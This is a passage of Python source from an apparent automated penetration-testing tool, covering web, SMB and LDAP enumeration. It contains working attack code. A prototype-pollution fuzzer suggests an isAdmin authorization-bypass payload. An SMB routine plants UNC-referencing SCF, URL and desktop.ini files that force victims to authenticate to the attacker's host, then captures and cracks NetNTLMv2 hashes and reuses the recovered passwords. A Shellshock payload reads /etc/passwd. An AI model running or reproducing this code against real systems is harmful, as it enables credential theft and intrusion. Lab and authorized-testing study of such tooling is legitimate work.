            loot.add_step("SMB: share consumes files -> weaponise the expected filetype for code exec")
        vulns.append({'port': 445, 'service': 'smb', 'product': 'Samba', 'version': '',
                     'desc': 'Writable share auto-processes uploaded files (RCE via correct filetype)',
                     'cve': '', 'exploit': 'upload a malicious file of the processed type (e.g. print/office/macro)',
                     'severity': 'high'})
    else:
        info("  no callback and files not consumed — not an auto-exec share in this window")
        _recommend(loot, f"inspect what consumes //{target}/<writable_share>; try the filetype the "
                   f"'reception/printer' job expects (.ps/.pjl/.pdf/.job) or a longer --catch-wait")
    return vulns


# ── Prototype pollution: client-side detection + server-side fuzzing (PPFuzz-style) ──
# Known client-side PP-vulnerable libraries (name -> first FIXED version).
_PP_VULN_LIBS = {
    'lodash': '4.17.21', 'jquery': '3.5.0', 'angular': '1.8.0', 'hoek': '5.0.3',
    'handlebars': '4.7.7', 'js-yaml': '3.13.1', 'minimist': '1.2.6',
    'set-value': '3.0.1', 'merge': '2.1.1', 'deep-extend': '0.5.1',
}
# Server-side PP oracles: payload -> (detector, description). Persist in the JS process.
_PP_ORACLES = [
    ('{"__proto__":{"json spaces":8}}', 'jsonspaces',
     'Express res.json() indentation pollution (json spaces)'),
    ('{"constructor":{"prototype":{"json spaces":8}}}', 'jsonspaces',
     'constructor.prototype json-spaces (filter bypass)'),
    ('{"__proto__":{"status":510}}', 'status510',
     'HTTP status pollution (status 510)'),
]


def _ver_lt(a, b):
    """True if version a < version b (numeric dotted compare)."""
    try:
        pa = [int(x) for x in re.findall(r'\d+', a)][:3]
        pb = [int(x) for x in re.findall(r'\d+', b)][:3]
        return pa < pb
    except Exception:
        return False


def run_prototype_pollution(url, port, corpus, outdir, args, tools, loot=None):
    """Detect prototype pollution: (1) passive client-side — flag known-vulnerable JS
    libraries + merge/__proto__ sinks; (2) active server-side fuzzing (PPFuzz-style) —
    inject __proto__/constructor.prototype payloads into JSON endpoints and confirm
    via server-side oracles (json-spaces indentation, status pollution). Gated."""
    vulns = []
    if not shutil.which('curl'):
        return vulns
    # ── (1) client-side: vulnerable library versions in script srcs ──
    _, body, _ = _run(['curl', '-skL', '--max-time', '10', url], timeout=15)
    for m in re.finditer(r'(?:src|href)=["\']([^"\']*?([a-z0-9_.-]+?)[.-]v?(\d+\.\d+\.\d+)[^"\']*\.js)["\']',
                         body or '', re.I):
        lib = m.group(2).lower().rstrip('.-')
        ver = m.group(3)
        for known, fixed in _PP_VULN_LIBS.items():
            if known in lib and _ver_lt(ver, fixed):
                good(f"  vulnerable lib: {lib} {ver} (< {fixed}) — prototype-pollution prone")
                if loot:
                    loot.add('auth_findings', f"outdated JS lib {lib} {ver} (<{fixed}) — prototype pollution")
                vulns.append({'port': port, 'service': 'http', 'product': lib, 'version': ver,
                             'desc': f'Outdated {lib} {ver} (fixed {fixed}) — prototype-pollution vulnerable',
                             'cve': '', 'exploit': f'see prototype-pollution gadgets for {lib}',
                             'severity': 'medium'})

    # ── candidate endpoints: DYNAMICALLY discovered (gobuster + crawler + JS), never a static list ──
    endpoints = set()
    gb = outdir / f'gobuster_{port}.txt'          # gobuster dir brute results
    if gb.exists():
        for l in gb.read_text().splitlines():
            seg = l.split()[0].strip() if l.strip() else ''
            if seg:
                endpoints.add(seg.strip('/'))
    ep_file = outdir / 'js_endpoints.txt'          # endpoints extracted from JS
    if ep_file.exists():
        endpoints.update(l.strip('/').strip() for l in ep_file.read_text().splitlines() if l.strip())
    for u in corpus.get('urls', []):               # crawler corpus paths
        p = u.split('://', 1)[-1].split('/', 1)
        if len(p) > 1 and p[1]:
            endpoints.add(p[1].split('?')[0])
    for u in corpus.get('params', []):             # parameterized endpoints from crawl
        p = u.split('://', 1)[-1].split('/', 1)
        if len(p) > 1 and p[1]:
            endpoints.add(p[1].split('?')[0])
    endpoints = {e for e in endpoints if e}

    if not active_enabled(args):
        _recommend(loot, f"PP fuzz: curl -s {url}/api/... -H 'Content-Type: application/json' "
                   f"-d '{{\"__proto__\":{{\"json spaces\":8}}}}'  then re-request & check JSON indentation "
                   f"(or {{\"constructor\":{{\"prototype\":{{\"isAdmin\":true}}}}}} for authz bypass)",
                   "prototype pollution (PPFuzz-style) on JSON endpoints")
        return vulns

    # ── (2) server-side fuzzing with oracles ──
    subsection("Prototype Pollution Fuzzing (server-side)")
    from urllib.parse import urljoin
    cj = outdir / f'pp_cookies_{port}'
    _run(['curl', '-sk', '-c', str(cj), '--max-time', '8', url], timeout=12)  # seed a session
    for ep in list(dict.fromkeys(endpoints))[:25]:
        target_ep = urljoin(url.rstrip('/') + '/', ep)
        for payload, oracle, desc in _PP_ORACLES:
            _run(['curl', '-sk', '-b', str(cj), '-c', str(cj), '-X', 'POST', target_ep,
                 '-H', 'Content-Type: application/json', '-d', payload, '--max-time', '8'], timeout=12)
            # probe: request a JSON-returning endpoint and inspect for the oracle effect
            code, probe, _ = _run(['curl', '-sk', '-b', str(cj), '-i', '--max-time', '8', target_ep], timeout=12)
            hdr, _, pbody = probe.partition('\r\n\r\n')
            if oracle == 'jsonspaces' and re.search(r'\{\n {8}"', pbody):
                good(f"  PROTOTYPE POLLUTION confirmed at {target_ep} ({desc})")
                if loot:
                    loot.add('auth_findings', f"server-side prototype pollution: {target_ep} ({desc})")
                    loot.add_step(f"Web: prototype pollution at {ep} -> try isAdmin/authz bypass gadget")
                vulns.append({'port': port, 'service': 'http', 'product': 'Node.js app', 'version': '',
                             'desc': f'Server-side prototype pollution at {ep} ({desc})', 'cve': '',
                             'exploit': f"curl {target_ep} -H 'Content-Type: application/json' "
                                        f"-d '{{\"__proto__\":{{\"isAdmin\":true}}}}'  # then hit admin route",
                             'severity': 'critical'})
                break
            if oracle == 'status510' and re.search(r'(?im)^HTTP/\d\.\d 510', probe):
                good(f"  PROTOTYPE POLLUTION confirmed at {target_ep} (status pollution)")
                if loot:
                    loot.add('auth_findings', f"server-side prototype pollution (status): {target_ep}")
                vulns.append({'port': port, 'service': 'http', 'product': 'Node.js app', 'version': '',
                             'desc': f'Server-side prototype pollution at {ep} (status oracle)', 'cve': '',
                             'exploit': f"pollute Object.prototype via {ep}", 'severity': 'critical'})
                break
    return vulns


def run_smb_hashcapture(target, services, outdir, args, tools, loot=None, context=None):
    """Capture NetNTLMv2 hashes via a writable share: drop SCF/URL/desktop.ini files
    referencing a UNC path back to us, run an impacket SMB server to catch the auth
    when the share's processor or a user resolves the icon/URL, then crack the hash
    (hashcat -m 5600) and feed the credential into the reuse loop. General technique;
    active-gated, needs --lhost and root (to bind 445)."""
    vulns = []
    context = context if context is not None else {}
    writ = context.get('writable_shares') or []
    lhost = getattr(args, 'lhost', None)
    smbsrv = shutil.which('smbserver.py') or shutil.which('impacket-smbserver')
    if not (active_enabled(args) and lhost and writ and shutil.which('smbclient') and smbsrv):
        if writ and shutil.which('smbclient'):
            _recommend(loot, r"drop a .scf/.url referencing \\LHOST\share into the writable share and run "
                       "impacket-smbserver/responder to capture NetNTLMv2, then hashcat -m 5600",
                       "SMB hash capture via writable share")
        return vulns
    import subprocess
    import glob
    subsection("SMB Hash Capture via Writable Share")
    capdir = outdir / 'smbcap'
    capdir.mkdir(exist_ok=True)
    logf = outdir / 'smbserver.log'
    # When run as root (via sudo) impacket may be a --user install of the invoking
    # user; expose it to the subprocess so smbserver.py can import impacket.
    env = dict(os.environ)
    extra_pp = list(sys.path)
    for home in filter(None, ['/home/' + os.environ.get('SUDO_USER', ''), os.path.expanduser('~')]):
        extra_pp += glob.glob(f'{home}/.local/lib/python3*/site-packages')
    env['PYTHONPATH'] = ':'.join(p for p in extra_pp if p) + ':' + env.get('PYTHONPATH', '')
    try:
        srv = subprocess.Popen([smbsrv, 'share', str(capdir), '-smb2support'],
                               stdout=open(logf, 'w'), stderr=subprocess.STDOUT, env=env)
    except Exception as e:
        warn(f"could not start smbserver (need root for :445?): {e}")
        return vulns
    time.sleep(2)
    if srv.poll() is not None:
        warn("smbserver exited immediately (port 445 in use or not root) — run the tool with sudo")
        return vulns

    # UNC-referencing trigger files (icon/URL resolution forces SMB auth back to us)
    scf = ("[Shell]\r\nCommand=2\r\nIconFile=\\\\%s\\share\\p.ico\r\n"
           "[Taskbar]\r\nCommand=ToggleDesktop\r\n" % lhost)
    url = ("[InternetShortcut]\r\nURL=file://%s/share/p\r\nIconIndex=1\r\n"
           "IconFile=\\\\%s\\share\\p.ico\r\n" % (lhost, lhost))
    dini = "[.ShellClassInfo]\r\nIconResource=\\\\%s\\share\\p.ico\r\n" % lhost
    (capdir / '@trigger.scf').write_text(scf)   # '@' sorts first so it's read early
    (capdir / 'trigger.url').write_text(url)
    (capdir / 'desktop.ini').write_text(dini)
    for sh in writ:
        info(f"dropping UNC hash-trigger files into //{target}/{sh}")
        for f in ('@trigger.scf', 'trigger.url', 'desktop.ini'):
            _run(['smbclient', f'//{target}/{sh}', '-N', '-c', f'put {capdir / f} {f}'], timeout=20)

    wait_s = int(getattr(args, 'catch_wait', None) or 280)
    info(f"waiting up to {wait_s}s for NetNTLMv2 auth to {lhost}:445 ...")
    hashes = []
    t0 = time.time()
    while time.time() - t0 < wait_s:
        time.sleep(15)
        log = logf.read_text(errors='ignore') if logf.exists() else ''
        hashes = re.findall(r'([^\s:]+::[^\s:]+:[0-9a-fA-F]{16}:[0-9a-fA-F]{32}:[0-9A-Fa-f]+)', log)
        if hashes:
            break
    try:
        srv.terminate()
    except Exception:
        pass

    if not hashes:
        info("  no NetNTLM auth captured (processor may not resolve UNC references)")
        return vulns
    good(f"  CAPTURED {len(set(hashes))} NetNTLMv2 hash(es)!")
    hf = outdir / 'netntlm.hash'
    hf.write_text('\n'.join(sorted(set(hashes))))
    for h in sorted(set(hashes)):
        u = h.split('::')[0]
        if loot:
            loot.add('keys', f'NetNTLMv2 for {u} (crack: hashcat -m 5600 netntlm.hash rockyou)')
            loot.add_step(f"Captured NetNTLMv2 for {u} -> crack -> credential")
    vulns.append({'port': 445, 'service': 'smb', 'product': 'Samba', 'version': '',
                 'desc': f'NetNTLMv2 hash(es) captured via writable-share UNC trigger ({len(set(hashes))})',
                 'cve': '', 'exploit': 'hashcat -m 5600 netntlm.hash rockyou.txt', 'severity': 'high'})

    # crack with hashcat -m 5600 (rockyou), feed cracked cred into the reuse loop
    rockyou = _first_path(['/usr/share/wordlists/rockyou.txt', '/usr/share/wordlists/rockyou.txt.gz'])
    if shutil.which('hashcat') and rockyou and rockyou.endswith('.txt'):
        info("hashcat -m 5600 (rockyou) — cracking captured NetNTLMv2 ...")
        cracked = outdir / 'netntlm.cracked'
        _run(['hashcat', '-m', '5600', str(hf), rockyou, '--force', '-o', str(cracked)], timeout=1200)
        if cracked.exists() and cracked.stat().st_size:
            for line in cracked.read_text(errors='ignore').splitlines():
                parts = line.split(':')
                if len(parts) >= 2:
                    u = parts[0]
                    pw = parts[-1]
                    good(f"  CRACKED {u}:{pw}")
                    if loot:
                        loot.add_cred(u, pw, source='netntlm-crack', scope='smb', verified=False)
                        loot.add_step(f"Cracked {u}:{pw} — reuse on projects/transfer shares + SSH")
                    if context is not None and not context.get('creds'):
                        context['creds'] = f"{u}:{pw}"
                    vulns.append({'port': 445, 'service': 'smb', 'product': 'Samba', 'version': '',
                                 'desc': f'Cracked NetNTLMv2 credential {u}:{pw}', 'cve': '',
                                 'exploit': f'smbclient //{target}/projects -U {u}%{pw}; ssh {u}@{target}',
                                 'severity': 'critical'})
    return vulns


def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None, hostnames=None):
    """Phase 5: Supplementary Tool Enumeration (vhosts, web, SMB, NFS, FTP, TLS, nuclei).
    Returns list of additional structured vuln findings discovered in phase 5."""
    section("PHASE 5: Supplementary Tools")

    hostnames = hostnames or []
    shellshock_vulns = []
    web_corpus = {'urls': set(), 'params': set()}   # crawler output, feeds injection/SSRF
    p5_context = {}                                  # shared AD state (domain/users/creds)

    # Searchsploit deep scan (re-run on any new services discovered in phase 3/4)
    if tools.get('searchsploit'):
        subsection("Searchsploit Deep Scan")
        for xml_file in sorted(outdir.glob('phase*.xml')):
            if 'phase1' in xml_file.name or 'phase2' in xml_file.name:
                continue
            sploit_out = run_searchsploit_nmap(xml_file)
            if sploit_out.strip() and 'No Results' not in sploit_out:
                info(f"searchsploit from {xml_file.name}:")
                for line in sploit_out.strip().split('\n')[:10]:
                    if line.strip():
                        print(f"    {line}")
                (outdir / f'searchsploit_{xml_file.stem}.txt').write_text(sploit_out)

    # Determine HTTP ports and build URL list
    # MQTT enumeration (1883/8883): anonymous subscribe often leaks creds in messages
    shellshock_vulns += run_mqtt_suite(target, services, outdir, args, tools, loot)

    http_ports = sorted([p for p, s in services.items()
                         if (any(x in s.get('service', '').lower() for x in ['http', 'www'])
                             or p in [80, 81, 443, 591, 2082, 2087, 2095, 2096, 3000, 3128, 5000,
                                      5001, 7001, 7070, 8000, 8008, 8080, 8081, 8088, 8090, 8099,
                                      8443, 8834, 8888, 9000, 9001, 9080, 9443, 10443])
                         # exclude RPC-over-HTTP / epmap / WinRM / ADWS which aren't real web apps
                         and not any(x in s.get('service', '').lower()
                                     for x in ['rpc', 'epmap', 'wsman', 'winrm', 'ncacn', 'mc-nmf'])
                         and p not in [593, 5985, 5986, 9389, 47001]
                         and p < 49152          # skip dynamic/ephemeral RPC ports
                         and 'httpapi' not in s.get('product', '').lower()])

    for port in http_ports:
        svc = services[port]
        tunnel = svc.get('tunnel', '')
        scheme = 'https' if tunnel == 'ssl' or port in [443, 8443, 9443, 10443] else 'http'
        url = f"{scheme}://{target}:{port}"
        subsection(f"HTTP Enumeration - {url}")

        # Quick path probes via curl
        if tools.get('curl'):
            probe_results = []
            for path in COMMON_WEB_PATHS:
                try:
                    r = subprocess.run(
                        ['curl', '-sk', '-o', '/dev/null',
                         '-w', '%{http_code}|%{size_download}',
                         f"{url}/{path}", '--max-time', '5'],
                        capture_output=True, text=True, timeout=7)
                    out = (r.stdout or '').strip()
                    if '|' in out:
                        code, size = out.split('|', 1)
                    else:
                        code, size = out, '0'
                    if code in HTTP_HIT_CODES - {'301', '302'} or (code in {'301', '302'} and int(size or 0) > 100):
                        good(f"  {url}/{path} => HTTP {code} ({size} bytes)")
                        probe_results.append(f"{path} {code} {size}")
                        if loot:
                            loot.add('urls', f"{url}/{path} (HTTP {code})")
                except Exception:
                    pass
            if probe_results:
                (outdir / f'http_paths_{port}.txt').write_text('\n'.join(probe_results))

            try:
                r = subprocess.run(['curl', '-skI', f"{url}/", '--max-time', '5'],
                                   capture_output=True, text=True, timeout=10)
                (outdir / f'http_headers_{port}.txt').write_text(r.stdout)
                for line in r.stdout.splitlines():
                    if line.lower().startswith(('server:', 'x-powered-by:', 'set-cookie:',
                                                'www-authenticate:', 'x-frame-options:',
                                                'content-security-policy:')):
                        print(f"    {C.Di}{line.strip()}{C.Re}")
            except Exception:
                pass

        # TLS deep scan
        if tunnel == 'ssl' or port in [443, 8443, 9443]:
            tls_findings = run_sslscan_or_testssl(target, port, outdir)
            for f in tls_findings:
                col = C.R if f['severity'] in ('critical', 'high') else C.Y
                print(f"    {col}[TLS-{f['severity'].upper()}] {f['desc']}{C.Re}")
                if loot:
                    loot.add('notes', f"TLS {f['severity']}: {f['desc']} on port {f['port']}")

        if tools.get('whatweb'):
            info(f"whatweb on {url}")
            try:
                r = subprocess.run(['whatweb', '-a', '3', '--no-errors', '--color=never', url],
                                   capture_output=True, text=True, timeout=30)
                if r.stdout.strip():
                    print(f"    {r.stdout.strip()[:500]}")
                    (outdir / f'whatweb_{port}.txt').write_text(r.stdout)
            except Exception:
                pass

        if tools.get('gobuster') and not args.no_gobuster:
            wordlists = [
                '/usr/share/wordlists/dirb/common.txt',
                '/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt',
                '/usr/share/seclists/Discovery/Web-Content/common.txt',
                '/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt',
                '/usr/share/wordlists/dirb/big.txt',
            ]
            wl = next((w for w in wordlists if Path(w).exists()), None)
            if wl:
                info(f"gobuster {url} (wl: {Path(wl).name})")
                try:
                    cmd = ['gobuster', 'dir', '-u', url, '-w', wl, '-t', '50',
                           '-q', '-k',
                           '-b', '404,400',
                           '--timeout', '5s',
                           '-o', str(outdir / f'gobuster_{port}.txt')]
                    r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
                    if r.stdout.strip():
                        for line in r.stdout.strip().split('\n')[:30]:
                            if line.strip():
                                print(f"    {line}")
                    elif (outdir / f'gobuster_{port}.txt').exists():
                        out = (outdir / f'gobuster_{port}.txt').read_text()
                        for line in out.split('\n')[:30]:
                            if line.strip():
                                print(f"    {line}")
                    # Recurse into high-value paths
                    gb_file = outdir / f'gobuster_{port}.txt'
                    if gb_file.exists():
                        content = gb_file.read_text()
                        for interesting in ['/cgi-bin/', '/admin/', '/api/', '/uploads/', '/backup/']:
                            if interesting in content:
                                sub_url = url.rstrip('/') + interesting
                                cgi_wordlists = [
                                    '/usr/share/seclists/Discovery/Web-Content/CGIs.txt',
                                    '/usr/share/wordlists/seclists/Discovery/Web-Content/CGIs.txt',
                                    '/usr/share/seclists/Discovery/Web-Content/common.txt',
                                ] if interesting == '/cgi-bin/' else wordlists
                                swl = next((w for w in cgi_wordlists if Path(w).exists()), wl)
                                # Extensions for cgi-bin are sh/py/pl/cgi
                                info(f"gobuster recurse into {sub_url} (wl: {Path(swl).name})")
                                sub_cmd = ['gobuster', 'dir', '-u', sub_url, '-w', swl,
                                           '-t', '50', '-q', '-k', '-b', '404,400',
                                           '--timeout', '5s',
                                           '-o', str(outdir / f'gobuster_{port}{interesting.replace("/", "_")}.txt')]
                                if interesting == '/cgi-bin/':
                                    sub_cmd.extend(['-x', 'sh,cgi,pl,py'])
                                try:
                                    r2 = subprocess.run(sub_cmd, capture_output=True,
                                                        text=True, timeout=240)
                                    sub_out = outdir / f'gobuster_{port}{interesting.replace("/", "_")}.txt'
                                    discovered_paths = []
                                    if sub_out.exists():
                                        lines_shown = 0
                                        for line in sub_out.read_text().split('\n'):
                                            if not line.strip():
                                                continue
                                            parts = line.split()
                                            path = parts[0] if parts else ''
                                            if not path:
                                                continue
                                            discovered_paths.append(path)
                                            if loot:
                                                loot.add('urls', sub_url.rstrip('/') + '/' + path.lstrip('/'))
                                            # Show Status: 200 findings and first 15 others
                                            if '(Status: 200)' in line or lines_shown < 15:
                                                print(f"      {line}")
                                                lines_shown += 1
                                    if interesting == '/cgi-bin/' and discovered_paths:
                                        ss_findings = check_shellshock(sub_url, discovered_paths)
                                        for f in ss_findings:
                                            print(f"    {C.R}{C.Bo}[SHELLSHOCK]{C.Re} {C.R}{f}{C.Re}")
                                            if loot:
                                                loot.add('notes', f"Shellshock: {f}")
                                                loot.add('creds', f"RCE as: {f.split(' - ')[-1].strip()}")
                                            # Record structured vuln
                                            vuln_url = f.split(' - ')[0]
                                            shellshock_vulns.append({
                                                'port': port, 'service': 'http',
                                                'product': 'Apache CGI', 'version': '',
                                                'desc': f'Shellshock RCE confirmed at {vuln_url}',
                                                'cve': 'CVE-2014-6271',
                                                'exploit': f'curl -H "User-Agent: () {{ :;}}; /bin/cat /etc/passwd" {vuln_url}',
                                                'severity': 'critical',
                                            })
                                except Exception as e:
                                    warn(f"  recurse failed: {e}")
                                break  # One recursion per target
                except Exception as e:
                    warn(f"gobuster failed: {e}")

        elif tools.get('ffuf') and not args.no_gobuster:
            wordlists = [
                '/usr/share/wordlists/dirb/common.txt',
                '/usr/share/seclists/Discovery/Web-Content/common.txt',
                '/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt',
            ]
            wl = next((w for w in wordlists if Path(w).exists()), None)
            if wl:
                info(f"ffuf {url}/FUZZ")
                try:
                    out_file = outdir / f'ffuf_{port}.json'
                    cmd = ['ffuf', '-u', f"{url}/FUZZ", '-w', wl, '-t', '40',
                           '-mc', '200,204,301,302,307,401,403',
                           '-s', '-of', 'json', '-o', str(out_file),
                           '-timeout', '5']
                    subprocess.run(cmd, capture_output=True, text=True, timeout=180)
                    if out_file.exists():
                        try:
                            data = json.loads(out_file.read_text())
                            for res in data.get('results', [])[:30]:
                                print(f"    {res.get('status')} {res.get('url')} ({res.get('length')} bytes)")
                        except Exception:
                            pass
                except Exception as e:
                    warn(f"ffuf failed: {e}")

        if tools.get('nikto'):
            info(f"nikto {url} (tuning: 1234567890abc)")
            try:
                r = subprocess.run(
                    ['nikto', '-h', url, '-nointeractive',
                     '-output', str(outdir / f'nikto_{port}.txt'),
                     '-Format', 'txt', '-Tuning', '1234567890abc', '-maxtime', '120s'],
                    capture_output=True, text=True, timeout=180)
                if r.stdout.strip():
                    for line in r.stdout.strip().split('\n')[:20]:
                        if '+' in line:
                            print(f"    {line}")
            except Exception:
                pass

        # Run nuclei on each HTTP endpoint
        if tools.get('nuclei') and not args.no_nuclei:
            findings = run_nuclei(url, outdir,
                                  severity='critical,high,medium,low',
                                  timeout=300)
            for f in findings[:30]:
                col = (C.R if f['severity'] in ('critical', 'high') else
                       C.Y if f['severity'] == 'medium' else C.Di)
                print(f"    {col}[NUCLEI-{f['severity'].upper()}] {f['name']} | {f['template']}{C.Re}")
                if loot:
                    loot.add('notes', f"Nuclei {f['severity']}: {f['name']} @ {f['matched_at']}")

        # wpscan if WordPress detected
        whatweb_file = outdir / f'whatweb_{port}.txt'
        if tools.get('wpscan') and whatweb_file.exists() and 'wordpress' in whatweb_file.read_text().lower():
            info(f"wpscan {url}")
            try:
                r = subprocess.run(
                    ['wpscan', '--url', url, '--enumerate', 'vp,vt,u1-10', '--random-user-agent',
                     '--disable-tls-checks', '-f', 'cli-no-color',
                     '-o', str(outdir / f'wpscan_{port}.txt')],
                    capture_output=True, text=True, timeout=240)
                if r.stdout.strip():
                    for line in r.stdout.strip().split('\n')[:30]:
                        if line.strip():
                            print(f"    {line}")
            except Exception:
                pass

        # Crawl this web service into the shared URL / parameter corpus
        pc = build_web_corpus(url, port, target, outdir, args, tools, loot)
        web_corpus['urls'].update(pc['urls'])
        web_corpus['params'].update(pc['params'])
        # Web foothold heuristics: HTML-intel (passive) + default-cred/LFI/IDOR (gated)
        shellshock_vulns += run_web_foothold_suite(url, port, pc, outdir, args, tools, loot)
        # Broken-auth / session / cookie / JWT testing (Tier1 passive, Tier2 gated, Tier3 recommend)
        shellshock_vulns += run_auth_suite(url, port, pc, outdir, args, tools, loot)
        # Web-stack fingerprint + source/JS/dir intel + framework->exploit lookup
        fp = fingerprint_stack(url, port, outdir, loot)
        js_urls, _links = harvest_page_intel(url, port, outdir, loot)
        shellshock_vulns += analyze_js(js_urls, outdir, args, loot)
        shellshock_vulns += run_prototype_pollution(url, port, pc, outdir, args, tools, loot)
        fetch_robots_sitemap(url, outdir, loot)
        # dirs from gobuster output + crawl corpus paths feed the listing/broken-perm check
        _dirs = set()
        _gb = outdir / f'gobuster_{port}.txt'
        if _gb.exists():
            _dirs.update(l.split()[0].strip('/') for l in _gb.read_text().splitlines() if l.strip())
        for _u in pc.get('urls', []):
            _seg = _u.split('://', 1)[-1].split('/')[1:2]
            if _seg and _seg[0]:
                _dirs.add(_seg[0])
        shellshock_vulns += check_dir_listing(url, port, _dirs, outdir, loot)
        shellshock_vulns += framework_exploit_lookup(fp, url, outdir, args, loot)
        p5_context.setdefault('web_fp', {})[port] = fp

    # ── Injection & SSRF testing (consume crawler corpus; active-gated) ──
    if web_corpus['params']:
        shellshock_vulns += run_injection_suite(web_corpus['params'], outdir, args, tools, loot)
        shellshock_vulns += run_ssrf_suite(web_corpus['params'], outdir, args, tools, loot)

    # ── Passive subdomain discovery (hostname targets only) ──
    _sub_host = args.hostname or target
    if tools.get('subfinder') and http_ports and not _is_ip(_sub_host):
        subsection("Subdomain Discovery (subfinder)")
        _, _sf_out, _ = _run(['subfinder', '-silent', '-d', _sub_host], timeout=180)
        subs = sorted({l.strip() for l in _sf_out.splitlines() if l.strip()})
        if subs:
            (outdir / 'subfinder.txt').write_text('\n'.join(subs))
            good(f"subfinder: {len(subs)} subdomains")
            if loot:
                for s in subs[:50]:
                    loot.add('notes', f'subdomain: {s}')

    # ── VHost / Subdomain enumeration ──
    if args.vhosts and http_ports:
        subsection("VHost / Subdomain Enumeration")
        base_host = args.hostname or next(iter(hostnames), None)
        if not base_host:
            warn("No hostname detected/provided; vhost brute will use FUZZ literal")
            base_host = args.hostname or 'htb.local'
        # Determine wordlist
        wl_candidates = [
            args.vhost_wordlist,
            '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt',
            '/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt',
            '/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt',
            '/usr/share/wordlists/dns/namelist.txt',
        ]
        wl = next((w for w in wl_candidates if w and Path(w).exists()), None)
        if not wl:
            # Built-in minimal wordlist
            builtin_wl = outdir / 'builtin_subdomains.txt'
            builtin_wl.write_text('\n'.join([
                'www', 'dev', 'test', 'stage', 'staging', 'prod', 'api', 'admin',
                'portal', 'app', 'blog', 'shop', 'mail', 'webmail', 'email',
                'ftp', 'ssh', 'vpn', 'proxy', 'gateway', 'auth', 'login',
                'cms', 'backend', 'frontend', 'intranet', 'monitoring',
                'git', 'gitlab', 'jenkins', 'sonar', 'jira', 'confluence',
                'internal', 'public', 'private', 'secure', 'files', 'cdn',
                'static', 'assets', 'docs', 'help', 'support', 'status',
                'demo', 'beta', 'alpha', 'sandbox', 'lab',
            ]))
            wl = str(builtin_wl)
            info(f"Using built-in vhost wordlist ({builtin_wl})")
        for port in http_ports:
            svc = services[port]
            scheme = 'https' if svc.get('tunnel') == 'ssl' or port in [443, 8443] else 'http'
            vhosts = vhost_bruteforce(target, port, scheme, wl,
                                      base_host=base_host, outdir=outdir, timeout=180)
            if vhosts:
                good(f"Discovered {len(vhosts)} vhost(s) on port {port}:")
                for v in vhosts[:20]:
                    print(f"    {v}")
                if loot:
                    for v in vhosts:
                        loot.add('urls', f"vhost://{v}:{port}")
                # Write discovered
                (outdir / f'vhosts_{port}.txt').write_text('\n'.join(vhosts))

    # SMB services
    smb_ports = [p for p, s in services.items()
                 if any(x in s.get('service', '').lower() for x in ['netbios', 'smb', 'microsoft-ds'])]
    if smb_ports:
        subsection("SMB Enumeration")
        if tools.get('enum4linux-ng') or tools.get('enum4linux'):
            tool = 'enum4linux-ng' if tools.get('enum4linux-ng') else 'enum4linux'
            info(f"Running {tool}")
            try:
                r = subprocess.run([tool, '-A', target],
                                   capture_output=True, text=True, timeout=180)
                (outdir / f'{tool}.txt').write_text(r.stdout)
                if loot:
                    loot.scan_output(r.stdout)
                for line in r.stdout.split('\n'):
                    if any(x in line.lower() for x in ['share', 'user', 'password', 'group']):
                        print(f"    {line.strip()}")
            except Exception:
                pass

        if tools.get('smbclient'):
            info("smbclient -L (null session)")
            try:
                r = subprocess.run(['smbclient', '-L', f'//{target}', '-N', '--option=client min protocol=NT1'],
                                   capture_output=True, text=True, timeout=15)
                if r.stdout.strip():
                    print(r.stdout[:2000])
                    (outdir / 'smbclient_list.txt').write_text(r.stdout)
                    if loot:
                        loot.scan_output(r.stdout)
            except Exception:
                pass

        for smb_tool in ('smbmap', 'netexec', 'crackmapexec'):
            if tools.get(smb_tool):
                info(f"Running {smb_tool}")
                try:
                    cmd = [smb_tool, '-H' if smb_tool == 'smbmap' else 'smb', target]
                    if smb_tool != 'smbmap':
                        cmd.extend(['--shares'])
                    r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
                    if r.stdout.strip():
                        print(r.stdout[:2000])
                        (outdir / f'{smb_tool}.txt').write_text(r.stdout)
                        if loot:
                            loot.scan_output(r.stdout)
                    break
                except Exception:
                    pass

    # LDAP enumeration
    ldap_ports = [p for p, s in services.items()
                  if 'ldap' in s.get('service', '').lower() or p in (389, 636, 3268, 3269)]
    domain_name = None
    ldap_users = []

    # Always try to extract domain from existing Nmap output (phase2/phase3 ldap)
    for xml_file in list(outdir.glob('phase3_ldap.xml')) + list(outdir.glob('phase2_services.xml')):
        try:
            content = xml_file.read_text()
            # Look for DC=foo,DC=bar or Domain: name.local
            m = re.search(r'DC=([\w-]+)(?:,DC=([\w-]+))+', content, re.I)
            if m:
                dc_parts = re.findall(r'DC=([\w-]+)', m.group(0), re.I)
                if dc_parts:
                    domain_name = '.'.join(dc_parts).lower()
                    break
            m2 = re.search(r'Domain:\s*([\w.-]+\.\w+)', content)
            if m2:
                domain_name = m2.group(1).lower()
                break
        except Exception:
            pass
    if domain_name:
        info(f"AD domain detected from Nmap LDAP: {domain_name}")

    # Try to extract service hostnames from Nmap smb-os-discovery (e.g., lame.hackthebox.gr)
    for xml_file in list(outdir.glob('phase3_smb.xml')) + list(outdir.glob('phase2_services.xml')):
        try:
            content = xml_file.read_text()
            m = re.search(r'FQDN:\s*([\w.-]+)', content)
            if m and loot:
                loot.add('notes', f"FQDN: {m.group(1)}")
                break
        except Exception:
            pass

    if ldap_ports and tools.get('ldapsearch'):
        subsection("LDAP Enumeration")
        for port in ldap_ports:
            info(f"ldapsearch anonymous bind on {target}:{port}")
            try:
                r = subprocess.run(
                    ['ldapsearch', '-x', '-H', f'ldap://{target}:{port}',
                     '-s', 'base', '-b', '', '-LLL'],
                    capture_output=True, text=True, timeout=20)
                if r.stdout.strip() and 'namingContexts' in r.stdout:
                    good(f"LDAP anonymous bind allowed on port {port}")
                    (outdir / f'ldap_{port}.txt').write_text(r.stdout)
                    naming = None
                    for m in re.findall(r'namingContexts:\s*(.+)', r.stdout):
                        naming = m.strip()
                        print(f"    naming context: {naming}")
                        # Extract domain from DC=foo,DC=bar pattern
                        dc_parts = re.findall(r'DC=([\w-]+)', naming, re.I)
                        if dc_parts and not domain_name:
                            domain_name = '.'.join(dc_parts)
                    if loot:
